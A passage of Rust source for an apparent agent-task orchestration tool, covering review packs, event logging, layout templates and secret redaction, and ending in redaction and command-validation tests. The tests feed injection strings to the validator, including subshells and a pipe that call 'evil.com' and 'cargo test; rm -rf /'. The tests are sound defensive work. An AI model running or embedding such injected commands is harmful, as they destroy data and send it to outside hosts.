    )
    .await
    .unwrap_or_default();

    let risk_notes = {
        let mut notes = Vec::new();
        if changed_files.len() > 25 {
            notes.push("large file count changed".to_string());
        }
        if changed_files
            .iter()
            .any(|f| f.ends_with("Cargo.toml") || f.ends_with("package.json"))
        {
            notes.push("dependency manifest changed".to_string());
        }
        if changed_files.iter().any(|f| {
            f.ends_with(".toml")
                || f.ends_with(".yml")
                || f.ends_with(".yaml")
                || f.ends_with(".json")
        }) {
            notes.push("configuration files modified".to_string());
        }
        notes
    };

    let review_dir = project_path
        .join(".pnevma")
        .join("data")
        .join("reviews")
        .join(task.id.to_string());
    tokio::fs::create_dir_all(&review_dir)
        .await
        .map_err(|e| e.to_string())?;
    let diff_path = review_dir.join("diff.patch");
    tokio::fs::write(&diff_path, diff.as_bytes())
        .await
        .map_err(|e| e.to_string())?;
    let context_path = PathBuf::from(&worktree.path)
        .join(".pnevma")
        .join("task-context.md");
    let context_exists = context_path.exists();

    let check_results_json = check_results
        .iter()
        .map(|row| {
            json!({
                "description": redact_text(&row.description, secrets),
                "check_type": row.check_type,
                "command": row.command.as_deref().map(|value| redact_text(value, secrets)),
                "passed": row.passed,
                "output": row.output.as_deref().map(|value| redact_text(value, secrets))
            })
        })
        .collect::<Vec<_>>();
    let pack = json!({
        "task_id": task.id,
        "task_title": task.title,
        "target_branch": target_branch,
        "branch": branch,
        "worktree_path": redact_text(&worktree.path, secrets),
        "changed_files": changed_files,
        "diff_summary": stats.trim(),
        "diff_path": diff_path.to_string_lossy().to_string(),
        "check_run": {
            "id": check_run.id,
            "status": check_run.status,
            "summary": check_run.summary
        },
        "check_results": check_results_json,
        "risk_notes": risk_notes,
        "agent_rationale": summary.map(|value| redact_text(value, secrets)),
        "context_manifest": {
            "path": context_path.to_string_lossy().to_string(),
            "exists": context_exists
        },
        "cost_usd": cost_usd
    });
    let pack_path = review_dir.join("review-pack.json");
    let safe_pack = redact_json_value(pack, secrets);
    tokio::fs::write(
        &pack_path,
        serde_json::to_string_pretty(&safe_pack).map_err(|e| e.to_string())?,
    )
    .await
    .map_err(|e| e.to_string())?;

    let review_row = ReviewRow {
        id: Uuid::new_v4().to_string(),
        task_id: task.id.to_string(),
        status: "Ready".to_string(),
        review_pack_path: pack_path.to_string_lossy().to_string(),
        reviewer_notes: None,
        approved_at: None,
    };
    db.upsert_review(&review_row)
        .await
        .map_err(|e| e.to_string())?;
    append_event(
        db,
        project_id,
        Some(task.id),
        None,
        "review",
        "ReviewPackGenerated",
        json!({
            "task_id": task.id,
            "review_pack_path": review_row.review_pack_path
        }),
    )
    .await;
    Ok(review_row)
}

fn is_terminal_task_status(status: &TaskStatus) -> bool {
    matches!(status, TaskStatus::Done | TaskStatus::Failed)
}

/// Check if all tasks in a workflow instance are terminal and update the instance status.
async fn check_workflow_completion(db: &pnevma_db::Db, task_id: &str) {
    let wt = match db.find_workflow_by_task(task_id).await {
        Ok(Some(wt)) => wt,
        _ => return,
    };

    let tasks = match db.list_workflow_tasks(&wt.workflow_id).await {
        Ok(t) => t,
        Err(_) => return,
    };

    let mut all_terminal = true;
    let mut any_failed = false;

    for wt_row in &tasks {
        match db.get_task(&wt_row.task_id).await {
            Ok(Some(task_row)) => match task_row.status.as_str() {
                "Done" => {}
                "Failed" => {
                    any_failed = true;
                }
                _ => {
                    all_terminal = false;
                }
            },
            _ => {
                all_terminal = false;
            }
        }
    }

    if all_terminal {
        let new_status = if any_failed { "Failed" } else { "Completed" };
        let _ = db
            .update_workflow_instance_status(&wt.workflow_id, new_status)
            .await;
    }
}

async fn stop_control_plane(state: &AppState) {
    let prior: Option<crate::control::ControlServerHandle> = {
        let mut slot = state.control_plane.lock().await;
        slot.take()
    };
    if let Some(handle) = prior {
        handle.shutdown().await;
    }
}

pub async fn restart_control_plane(
    state: &AppState,
    project_path: &Path,
    project_config: &ProjectConfig,
    global_config: &GlobalConfig,
) -> Result<(), String> {
    stop_control_plane(state).await;
    let settings = resolve_control_plane_settings(project_path, project_config, global_config)?;
    // Note: start_control_plane requires Arc<AppState>. The bridge layer should call this
    // with a proper Arc. Here we skip starting the control plane server since we only
    // have &AppState. The bridge is responsible for starting the control plane with Arc<AppState>.
    drop(settings); // settings validated, control plane started by bridge
    Ok(())
}

async fn cleanup_task_worktree(
    db: &Db,
    git: &Arc<GitService>,
    project_id: Uuid,
    task_id: Uuid,
    emitter: Option<&Arc<dyn EventEmitter>>,
) -> Result<(), String> {
    let task_id_str = task_id.to_string();
    if let Some(worktree) = db
        .find_worktree_by_task(&task_id_str)
        .await
        .map_err(|e| e.to_string())?
    {
        if let Err(err) = git
            .cleanup_persisted_worktree(task_id, &worktree.path, Some(&worktree.branch), false)
            .await
        {
            append_event(
                db,
                project_id,
                Some(task_id),
                None,
                "git",
                "WorktreeCleanupFailed",
                json!({"task_id": task_id_str, "error": err.to_string(), "path": worktree.path}),
            )
            .await;
        } else {
            append_event(
                db,
                project_id,
                Some(task_id),
                None,
                "git",
                "WorktreeRemoved",
                json!({"task_id": task_id_str, "path": worktree.path}),
            )
            .await;
        }
        db.remove_worktree_by_task(&task_id_str)
            .await
            .map_err(|e| e.to_string())?;
    }

    if let Some(mut row) = db.get_task(&task_id_str).await.map_err(|e| e.to_string())? {
        let mut changed = false;
        if row.branch.is_some() {
            row.branch = None;
            changed = true;
        }
        if row.worktree_id.is_some() {
            row.worktree_id = None;
            changed = true;
        }
        if changed {
            row.updated_at = Utc::now();
            db.update_task(&row).await.map_err(|e| e.to_string())?;
            emit_task_updated(db, project_id, task_id).await;
            if let Some(emitter) = emitter {
                emit_enriched_task_event(emitter, db, &task_id_str).await;
            }
        }
    }
    Ok(())
}

pub(crate) async fn append_event(
    db: &Db,
    project_id: Uuid,
    task_id: Option<Uuid>,
    session_id: Option<Uuid>,
    source: &str,
    event_type: &str,
    payload: serde_json::Value,
) {
    let safe_payload = redact_payload_for_project_log(project_id, payload);
    let _ = db
        .append_event(NewEvent {
            id: Uuid::new_v4().to_string(),
            project_id: project_id.to_string(),
            task_id: task_id.map(|v| v.to_string()),
            session_id: session_id.map(|v| v.to_string()),
            trace_id: Uuid::new_v4().to_string(),
            source: source.to_string(),
            event_type: event_type.to_string(),
            payload: safe_payload,
        })
        .await;
}

pub(crate) async fn append_telemetry_event(
    db: &Db,
    project_id: Uuid,
    global_config: &GlobalConfig,
    event_type: &str,
    payload: serde_json::Value,
) {
    if !global_config.telemetry_opt_in {
        return;
    }
    let safe_payload = redact_payload_for_project_log(project_id, payload);
    let _ = db
        .append_telemetry_event(&TelemetryEventRow {
            id: Uuid::new_v4().to_string(),
            project_id: project_id.to_string(),
            event_type: event_type.to_string(),
            payload_json: safe_payload.to_string(),
            anonymized: true,
            created_at: Utc::now(),
        })
        .await;
}

fn normalize_layout_template_name(input: &str) -> String {
    let mut out = String::new();
    let mut last_was_sep = false;
    for ch in input.trim().chars() {
        if ch.is_ascii_alphanumeric() {
            out.push(ch.to_ascii_lowercase());
            last_was_sep = false;
            continue;
        }
        if !last_was_sep {
            out.push('-');
            last_was_sep = true;
        }
    }
    out.trim_matches('-').to_string()
}

fn default_layout_template_display_name(name: &str) -> String {
    let mut parts = Vec::new();
    for part in name.split('-') {
        let mut chars = part.chars();
        let Some(first) = chars.next() else {
            continue;
        };
        let mut label = String::new();
        label.push(first.to_ascii_uppercase());
        label.push_str(chars.as_str());
        parts.push(label);
    }
    if parts.is_empty() {
        "Template".to_string()
    } else {
        parts.join(" ")
    }
}

fn system_layout_templates() -> Vec<(String, String, Vec<PaneLayoutTemplatePane>)> {
    vec![
        (
            "solo-focus".to_string(),
            "Solo Focus".to_string(),
            vec![
                PaneLayoutTemplatePane {
                    id: "pane-board".to_string(),
                    session_id: None,
                    r#type: "task-board".to_string(),
                    position: "root".to_string(),
                    label: "Task Board".to_string(),
                    metadata_json: None,
                },
                PaneLayoutTemplatePane {
                    id: "pane-solo-terminal".to_string(),
                    session_id: None,
                    r#type: "terminal".to_string(),
                    position: "after:pane-board".to_string(),
                    label: "Terminal".to_string(),
                    metadata_json: None,
                },
            ],
        ),
        (
            "review-mode".to_string(),
            "Review Mode".to_string(),
            vec![
                PaneLayoutTemplatePane {
                    id: "pane-board".to_string(),
                    session_id: None,
                    r#type: "task-board".to_string(),
                    position: "root".to_string(),
                    label: "Task Board".to_string(),
                    metadata_json: None,
                },
                PaneLayoutTemplatePane {
                    id: "pane-review-diff".to_string(),
                    session_id: None,
                    r#type: "diff".to_string(),
                    position: "after:pane-board".to_string(),
                    label: "Diff Review".to_string(),
                    metadata_json: None,
                },
                PaneLayoutTemplatePane {
                    id: "pane-review-queue".to_string(),
                    session_id: None,
                    r#type: "merge-queue".to_string(),
                    position: "after:pane-review-diff".to_string(),
                    label: "Merge Queue".to_string(),
                    metadata_json: None,
                },
            ],
        ),
        (
            "debug-mode".to_string(),
            "Debug Mode".to_string(),
            vec![
                PaneLayoutTemplatePane {
                    id: "pane-debug-terminal".to_string(),
                    session_id: None,
                    r#type: "terminal".to_string(),
                    position: "root".to_string(),
                    label: "Terminal".to_string(),
                    metadata_json: None,
                },
                PaneLayoutTemplatePane {
                    id: "pane-debug-replay".to_string(),
                    session_id: None,
                    r#type: "replay".to_string(),
                    position: "after:pane-debug-terminal".to_string(),
                    label: "Replay".to_string(),
                    metadata_json: None,
                },
                PaneLayoutTemplatePane {
                    id: "pane-debug-events".to_string(),
                    session_id: None,
                    r#type: "search".to_string(),
                    position: "after:pane-debug-replay".to_string(),
                    label: "Events".to_string(),
                    metadata_json: None,
                },
            ],
        ),
    ]
}

fn parse_template_panes(raw: &str) -> Result<Vec<PaneLayoutTemplatePane>, String> {
    serde_json::from_str::<Vec<PaneLayoutTemplatePane>>(raw).map_err(|e| e.to_string())
}

fn panes_to_template_json(panes: &[PaneLayoutTemplatePane]) -> Result<String, String> {
    serde_json::to_string(panes).map_err(|e| e.to_string())
}

fn pane_layout_template_view_from_row(
    row: PaneLayoutTemplateRow,
) -> Result<PaneLayoutTemplateView, String> {
    Ok(PaneLayoutTemplateView {
        id: row.id,
        name: row.name,
        display_name: row.display_name,
        is_system: row.is_system,
        panes: parse_template_panes(&row.pane_graph_json)?,
        created_at: row.created_at,
        updated_at: row.updated_at,
    })
}

fn pane_contains_unsaved_metadata(metadata_json: Option<&str>) -> bool {
    let Some(raw) = metadata_json else {
        return false;
    };
    let Ok(value) = serde_json::from_str::<serde_json::Value>(raw) else {
        return false;
    };
    value
        .get("unsaved")
        .and_then(|v| v.as_bool())
        .unwrap_or(false)
        || value
            .get("dirty")
            .and_then(|v| v.as_bool())
            .unwrap_or(false)
}

fn session_state_may_be_unsaved(status: &str) -> bool {
    !matches!(
        status.to_ascii_lowercase().as_str(),
        "exited" | "failed" | "stopped" | "done" | "dead" | "completed"
    )
}

async fn ensure_system_layout_templates(db: &Db, project_id: Uuid) -> Result<(), String> {
    let now = Utc::now();
    for (name, display_name, panes) in system_layout_templates() {
        let existing = db
            .get_pane_layout_template(&project_id.to_string(), &name)
            .await
            .map_err(|e| e.to_string())?;
        let (id, created_at) = existing
            .map(|row| (row.id, row.created_at))
            .unwrap_or_else(|| (Uuid::new_v4().to_string(), now));
        db.upsert_pane_layout_template(&PaneLayoutTemplateRow {
            id,
            project_id: project_id.to_string(),
            name,
            display_name,
            pane_graph_json: panes_to_template_json(&panes)?,
            is_system: true,
            created_at,
            updated_at: now,
        })
        .await
        .map_err(|e| e.to_string())?;
    }
    Ok(())
}

async fn ensure_default_panes(db: &Db, project_id: Uuid) -> Result<(), String> {
    let existing = db
        .list_panes(&project_id.to_string())
        .await
        .map_err(|e| e.to_string())?;
    if !existing.is_empty() {
        return Ok(());
    }

    db.upsert_pane(&PaneRow {
        id: "pane-board".to_string(),
        project_id: project_id.to_string(),
        session_id: None,
        r#type: "task-board".to_string(),
        position: "root".to_string(),
        label: "Task Board".to_string(),
        metadata_json: None,
    })
    .await
    .map_err(|e| e.to_string())?;

    Ok(())
}

/// Build a list of secret values to be redacted from session output.
/// Reads well-known environment variables and filters out empty/missing ones.
pub(crate) fn build_secrets_list() -> Vec<String> {
    const SECRET_ENV_VARS: &[&str] = &[
        "ANTHROPIC_API_KEY",
        "OPENAI_API_KEY",
        "CLAUDE_API_KEY",
        "GITHUB_TOKEN",
        "PNEVMA_SECRET",
    ];
    let secrets = SECRET_ENV_VARS
        .iter()
        .filter_map(|var| {
            let val = std::env::var(var).unwrap_or_default();
            if val.is_empty() {
                None
            } else {
                Some(val)
            }
        })
        .collect::<Vec<_>>();
    normalize_redaction_secrets(&secrets)
}

pub(crate) async fn load_redaction_secrets(db: &Db, project_id: Uuid) -> Vec<String> {
    let mut secrets = build_secrets_list();
    match resolve_secret_env(db, project_id).await {
        Ok((_, secret_values)) => secrets.extend(secret_values),
        Err(err) => tracing::warn!(
            project_id = %project_id,
            "failed to load keychain-backed redaction secrets: {err}"
        ),
    }
    normalize_redaction_secrets(&secrets)
}

async fn emit_session_output_chunk(
    emitter: &Arc<dyn EventEmitter>,
    db: &Db,
    project_id: Uuid,
    session_id: Uuid,
    safe_chunk: String,
    secrets: &Arc<RwLock<Vec<String>>>,
) {
    emitter.emit(
        "session_output",
        json!({"session_id": session_id, "chunk": safe_chunk.clone()}),
    );
    append_event(
        db,
        project_id,
        None,
        Some(session_id),
        "session",
        "SessionOutputChunk",
        json!({"chunk": safe_chunk.clone()}),
    )
    .await;
    for attention in parse_osc_attention(&safe_chunk) {
        let body = if attention.body.trim().is_empty() {
            format!("OSC {} attention sequence received", attention.code)
        } else {
            attention.body
        };
        let current_secrets = current_redaction_secrets(secrets).await;
        let _ = create_notification_row(
            db,
            emitter,
            project_id,
            None,
            Some(session_id),
            osc_title(&attention.code),
            &body,
            Some(osc_level(&attention.code)),
            "osc",
            &current_secrets,
        )
        .await;
    }
}

fn spawn_session_bridge(
    emitter: Arc<dyn EventEmitter>,
    db: Db,
    sessions: SessionSupervisor,
    project_id: Uuid,
    secrets: Arc<RwLock<Vec<String>>>,
) -> tokio::task::JoinHandle<()> {
    let mut rx = sessions.subscribe();
    tokio::spawn(async move {
        let mut output_redactors: HashMap<Uuid, StreamRedactor> = HashMap::new();
        while let Ok(event) = rx.recv().await {
            match event {
                SessionEvent::Spawned(meta) => {
                    let row = session_row_from_meta(&meta);
                    let live_session = live_session_view_from_meta(&meta);
                    let _ = db.upsert_session(&row).await;
                    emitter.emit(
                        "session_spawned",
                        json!({
                            "project_id": project_id,
                            "session_id": meta.id,
                            "name": meta.name,
                            "session": live_session
                        }),
                    );
                    append_event(
                        &db,
                        project_id,
                        None,
                        Some(meta.id),
                        "session",
                        "SessionSpawned",
                        json!({"name": meta.name, "cwd": meta.cwd}),
                    )
                    .await;
                }
                SessionEvent::Output { session_id, chunk } => {
                    let redactor = output_redactors
                        .entry(session_id)
                        .or_insert_with(|| StreamRedactor::new(Arc::clone(&secrets)));
                    if let Some(safe_chunk) = redactor.push_chunk(&chunk).await {
                        emit_session_output_chunk(
                            &emitter, &db, project_id, session_id, safe_chunk, &secrets,
                        )
                        .await;
                    }
                }
                SessionEvent::Heartbeat { session_id, health } => {
                    let session_payload = if let Some(meta) = sessions.get(session_id).await {
                        let row = session_row_from_meta(&meta);
                        let _ = db.upsert_session(&row).await;
                        Some(live_session_view_from_meta(&meta))
                    } else {
                        None
                    };
                    let mut payload = json!({
                        "project_id": project_id,
                        "session_id": session_id,
                        "health": session_health_to_string(&health)
                    });
                    if let Some(s) = session_payload {
                        payload["session"] =
                            serde_json::to_value(s).expect("LiveSessionView must serialize");
                    }
                    emitter.emit("session_heartbeat", payload);
                }
                SessionEvent::Exited { session_id, code } => {
                    let session_payload = if let Some(meta) = sessions.get(session_id).await {
                        let row = session_row_from_meta(&meta);
                        let _ = db.upsert_session(&row).await;
                        Some(live_session_view_from_meta(&meta))
                    } else {
                        None
                    };
                    let mut payload = json!({
                        "project_id": project_id,
                        "session_id": session_id,
                        "code": code
                    });
                    if let Some(s) = session_payload {
                        payload["session"] =
                            serde_json::to_value(s).expect("LiveSessionView must serialize");
                    }
                    if let Some(redactor) = output_redactors.get_mut(&session_id) {
                        if let Some(safe_chunk) = redactor.finish().await {
                            emit_session_output_chunk(
                                &emitter, &db, project_id, session_id, safe_chunk, &secrets,
                            )
                            .await;
                        }
                    }
                    output_redactors.remove(&session_id);
                    emitter.emit("session_exited", payload);
                    append_event(
                        &db,
                        project_id,
                        None,
                        Some(session_id),
                        "session",
                        "SessionExited",
                        json!({"exit_code": code}),
                    )
                    .await;
                }
            }
        }
    })
}

#[cfg(test)]
mod redaction_tests {
    use super::*;

    // ── redact_text ───────────────────────────────────────────────────────────

    #[test]
    fn known_secret_is_replaced() {
        let secret = "s3cr3t-api-key-value".to_string();
        let input = format!("connecting with token {secret} now");
        let output = redact_text(&input, std::slice::from_ref(&secret));
        assert!(
            !output.contains(&secret),
            "secret must not appear in output; got: {output}"
        );
        assert!(output.contains("[REDACTED]"));
    }

    #[test]
    fn multiple_secrets_all_replaced() {
        let s1 = "alpha-secret".to_string();
        let s2 = "beta-secret".to_string();
        let input = format!("first={s1} second={s2}");
        let output = redact_text(&input, &[s1.clone(), s2.clone()]);
        assert!(!output.contains(&s1), "s1 must be redacted");
        assert!(!output.contains(&s2), "s2 must be redacted");
    }

    #[test]
    fn partial_substring_is_replaced_literally() {
        // The secret substring is replaced wherever it appears, even inside longer words.
        let secret = "secr".to_string();
        let input = "secret-value is here".to_string();
        let output = redact_text(&input, std::slice::from_ref(&secret));
        // "secr" appears inside "secret" — it will be replaced literally.
        assert!(
            !output.contains(&secret),
            "literal substring must be replaced"
        );
    }

    #[test]
    fn empty_secrets_list_returns_pattern_redacted() {
        // No explicit secrets, but pattern-based redaction still fires.
        let input = "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.payload.sig";
        let output = redact_text(input, &[]);
        assert!(
            !output.contains("eyJhbGciOiJIUzI1NiJ9"),
            "bearer token must be redacted"
        );
        assert!(output.contains("[REDACTED]"));
    }

    #[test]
    fn empty_secret_string_is_ignored() {
        let input = "hello world".to_string();
        let output = redact_text(&input, &["".to_string()]);
        // Empty secret is skipped; text should be unchanged (no pattern match here).
        assert_eq!(output, input);
    }

    #[tokio::test]
    async fn stream_redactor_redacts_secret_split_across_chunks() {
        let secrets = Arc::new(RwLock::new(vec!["supersecret123".to_string()]));
        let mut redactor = StreamRedactor::new(secrets);

        let first = redactor
            .push_chunk("prefix super")
            .await
            .expect("safe prefix should flush");
        assert_eq!(first, "prefix ");

        let second = redactor
            .push_chunk("secret123 suffix")
            .await
            .expect("completed secret should flush");
        assert_eq!(second, "[REDACTED] suffix");
    }

    #[tokio::test]
    async fn stream_redactor_redacts_pattern_split_across_chunks() {
        let secrets = Arc::new(RwLock::new(Vec::new()));
        let mut redactor = StreamRedactor::new(secrets);

        assert!(
            redactor.push_chunk("Authorization: Bea").await.is_none(),
            "partial auth prefix should be retained"
        );

        let output = redactor
            .push_chunk("rer abc123\n")
            .await
            .expect("completed auth header should flush");
        assert_eq!(output, "Authorization: Bearer [REDACTED]\n");
    }

    #[tokio::test]
    async fn stream_redactor_flushes_safe_marker_words_immediately() {
        let secrets = Arc::new(RwLock::new(Vec::new()));
        let mut redactor = StreamRedactor::new(secrets);

        let output = redactor
            .push_chunk("enter token\n")
            .await
            .expect("safe text should flush immediately");
        assert_eq!(output, "enter token\n");
    }

    #[tokio::test]
    async fn stream_redactor_uses_live_secret_updates() {
        let secrets = Arc::new(RwLock::new(Vec::new()));
        let mut redactor = StreamRedactor::new(Arc::clone(&secrets));

        let first = redactor
            .push_chunk("safe prefix\n")
            .await
            .expect("safe text should flush");
        assert_eq!(first, "safe prefix\n");

        *secrets.write().await = vec!["rotated-secret".to_string()];

        let second = redactor
            .push_chunk("token=rotated-secret\n")
            .await
            .expect("updated secret should be redacted");
        assert_eq!(second, "token=[REDACTED]\n");
    }

    #[tokio::test]
    async fn stream_redactor_redacts_provider_assignment_split_across_chunks() {
        let secrets = Arc::new(RwLock::new(Vec::new()));
        let mut redactor = StreamRedactor::new(secrets);

        assert!(redactor
            .push_chunk(r#"OPENAI_API_KEY="sk-proj-abcdef"#)
            .await
            .is_none());

        let output = redactor
            .push_chunk(r#"ghijklmnopqrstuvwxyz1234567890" done"#)
            .await
            .expect("completed provider assignment should flush");
        assert_eq!(output, "OPENAI_API_KEY=[REDACTED] done");
    }

    // ── redact_patterns ───────────────────────────────────────────────────────

    #[test]
    fn api_key_pattern_is_redacted() {
        let input = "api_key=super-secret-value,other=123";
        let output = redact_patterns(input);
        assert!(
            !output.contains("super-secret-value"),
            "api_key value must be redacted; got: {output}"
        );
        assert!(output.contains("[REDACTED]"));
    }

    #[test]
    fn bearer_token_pattern_is_redacted() {
        let input = "Authorization: Bearer mysecrettoken123";
        let output = redact_patterns(input);
        assert!(
            !output.contains("mysecrettoken123"),
            "bearer token must be redacted"
        );
    }

    #[test]
    fn password_pattern_is_redacted() {
        // The regex matches `keyword:value` or `keyword=value` adjacently.
        // JSON format `"password": "v"` has a closing quote before `:`, breaking adjacency.
        // Use key=value format which the regex handles directly.
        let input = "password=hunter2 other=safe";
        let output = redact_patterns(input);
        assert!(
            !output.contains("hunter2"),
            "password value must be redacted; got: {output}"
        );
    }

    #[test]
    fn github_token_pattern_is_redacted() {
        let input = "token=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij0123456789";
        let output = redact_patterns(input);
        assert!(!output.contains("ghp_"), "github token must be redacted");
    }

    #[test]
    fn provider_token_pattern_is_redacted() {
        let input = "token sk-proj-abcdefghijklmnopqrstuvwxyz1234567890";
        let output = redact_patterns(input);
        assert!(
            !output.contains("sk-proj-"),
            "provider token must be redacted"
        );
        assert!(output.contains("[REDACTED]"));
    }

    #[test]
    fn quoted_env_assignment_pattern_is_redacted() {
        let input = r#"ANTHROPIC_API_KEY="sk-ant-api03-abcdefghijklmnopqrstuvwxyz1234567890""#;
        let output = redact_patterns(input);
        assert_eq!(output, "ANTHROPIC_API_KEY=[REDACTED]");
    }

    #[test]
    fn non_sensitive_text_is_not_modified() {
        let input = "hello world, this is safe";
        let output = redact_patterns(input);
        assert_eq!(output, input);
    }

    // ── command validation ────────────────────────────────────────────────────

    #[test]
    fn test_command_validation_rejects_dollar_subshell() {
        let cmd = "cargo test $(curl evil.com)";
        let has_invalid = cmd
            .chars()
            .any(|c| !matches!(c, 'a'..='z' | 'A'..='Z' | '0'..='9' | ' ' | '_' | '.' | '/' | ':' | '=' | ',' | '+' | '@' | '-'));
        assert!(has_invalid, "should reject $ character");
    }

    #[test]
    fn test_command_validation_rejects_backtick_subshell() {
        let cmd = "cargo test `curl evil.com`";
        let has_invalid = cmd
            .chars()
            .any(|c| !matches!(c, 'a'..='z' | 'A'..='Z' | '0'..='9' | ' ' | '_' | '.' | '/' | ':' | '=' | ',' | '+' | '@' | '-'));
        assert!(has_invalid, "should reject backtick character");
    }

    #[test]
    fn test_command_validation_rejects_semicolon_injection() {
        let cmd = "cargo test; rm -rf /";
        let has_invalid = cmd
            .chars()
            .any(|c| !matches!(c, 'a'..='z' | 'A'..='Z' | '0'..='9' | ' ' | '_' | '.' | '/' | ':' | '=' | ',' | '+' | '@' | '-'));
        assert!(has_invalid, "should reject semicolon");
    }

    #[test]
    fn test_command_validation_rejects_pipe_injection() {
        let cmd = "cargo test | curl evil.com";
        let has_invalid = cmd
            .chars()
            .any(|c| !matches!(c, 'a'..='z' | 'A'..='Z' | '0'..='9' | ' ' | '_' | '.' | '/' | ':' | '=' | ',' | '+' | '@' | '-'));
        assert!(has_invalid, "should reject pipe character");
    }

    #[test]
    fn test_command_validation_accepts_normal_cargo_test() {
        let cmd = "cargo test --workspace";
        let has_invalid = cmd
            .chars()
            .any(|c| !matches!(c, 'a'..='z' | 'A'..='Z' | '0'..='9' | ' ' | '_' | '.' | '/' | ':' | '=' | ',' | '+' | '@' | '-'));
        assert!(!has_invalid, "should accept normal cargo test command");
    }

    #[test]
    fn split_test_command_parses_safe_argv() {
        let (program, args) =
            split_test_command("cargo test --workspace --package pnevma-core").expect("parse");
        assert_eq!(program, "cargo");
        assert_eq!(
            args,
            vec!["test", "--workspace", "--package", "pnevma-core"]
        );
    }

    #[test]
    fn split_test_command_rejects_empty_input() {
        assert!(split_test_command("   ").is_err());
    }

    // ── redact_json_value ────────────────────────────────────────────────────

    #[test]
    fn json_string_secret_is_redacted() {
        let secret = "json-secret-xyz".to_string();
        let val = serde_json::json!({"key": "json-secret-xyz", "other": 42});
        let out = redact_json_value(val, std::slice::from_ref(&secret));
        let out_str = out.to_string();
        assert!(
            !out_str.contains(&secret),
            "secret must not appear in JSON output"
        );
    }

    #[test]
    fn json_nested_array_strings_are_redacted() {
        let secret = "nested-secret".to_string();
        let val = serde_json::json!(["nested-secret", "safe-value"]);
        let out = redact_json_value(val, std::slice::from_ref(&secret));
        let out_str = out.to_string();
        assert!(!out_str.contains(&secret));
    }

    #[test]
    fn json_sensitive_key_is_redacted_without_known_secret() {
        let val = serde_json::json!({
            "password": "hunter2",
            "token": "abc123",
            "safe": "hello"
        });
        let out = redact_json_value(val, &[]);
        assert_eq!(out["password"], "[REDACTED]");
        assert_eq!(out["token"], "[REDACTED]");
        assert_eq!(out["safe"], "hello");
    }

    #[test]
    fn json_nested_sensitive_key_is_redacted() {
        let val = serde_json::json!({
            "auth": {
                "Authorization": "Bearer live-token",
                "refresh_token": "refresh-me"
            }
        });
        let out = redact_json_value(val, &[]);
        assert_eq!(out["auth"]["Authorization"], "[REDACTED]");
        assert_eq!(out["auth"]["refresh_token"], "[REDACTED]");
    }

    #[test]
    fn project_log_redaction_uses_registered_secret_values() {
        let project_id = Uuid::new_v4();
        let secret = "project-secret-value".to_string();
        register_project_redaction_secrets(project_id, std::slice::from_ref(&secret));

        let out = redact_payload_for_project_log(
            project_id,
            serde_json::json!({"chunk": format!("token={secret}")}),
        );
        let out_str = out.to_string();
        assert!(!out_str.contains(&secret));
        assert!(out_str.contains("[REDACTED]"));

        clear_project_redaction_secrets(project_id);
    }

    #[test]
    fn project_log_redaction_catches_provider_tokens_without_registered_values() {
        let project_id = Uuid::new_v4();
        let out = redact_payload_for_project_log(
            project_id,
            serde_json::json!({
                "chunk": "OPENAI_API_KEY=sk-proj-abcdefghijklmnopqrstuvwxyz1234567890"
            }),
        );
        let out_str = out.to_string();
        assert!(!out_str.contains("sk-proj-"));
        assert!(out_str.contains("[REDACTED]"));
    }

    #[tokio::test]
    async fn discover_markdown_files_ignores_missing_glob_parent() {
        let project_root =
            std::env::temp_dir().join(format!("pnevma-discover-markdown-{}", Uuid::new_v4()));
        tokio::fs::create_dir_all(&project_root)
            .await
            .expect("create temp project root");

        let files = discover_markdown_files(
            &[
                ".pnevma/rules/*.md".to_string(),
                ".pnevma/conventions/*.md".to_string(),
            ],
            &project_root,
        )
        .await
        .expect("missing scope dirs should not fail discovery");

        assert!(
            files.is_empty(),
            "missing scope dirs should produce no files"
        );

        let _ = tokio::fs::remove_dir_all(&project_root).await;
    }

    #[test]
    fn live_session_event_payload_uses_normalized_public_shape() {
        let row = SessionRow {
            id: Uuid::new_v4().to_string(),
            project_id: Uuid::new_v4().to_string(),
            name: "Terminal".to_string(),
            r#type: Some("terminal".to_string()),
            status: "running".to_string(),
            pid: Some(42),
            cwd: "/tmp/project".to_string(),
            command: "zsh".to_string(),
            branch: Some("main".to_string()),
            worktree_id: Some(Uuid::new_v4().to_string()),
            started_at: Utc::now(),
            last_heartbeat: Utc::now(),
        };

        let payload = session_row_to_event_payload(&row);

        assert_eq!(payload["id"], row.id);
        assert_eq!(payload["status"], "running");
        assert_eq!(payload["health"], "active");
        assert_eq!(payload["cwd"], row.cwd);
        assert!(payload.get("project_id").is_none());
        assert!(payload.get("branch").is_none());
        assert!(payload.get("worktree_id").is_none());
    }
}
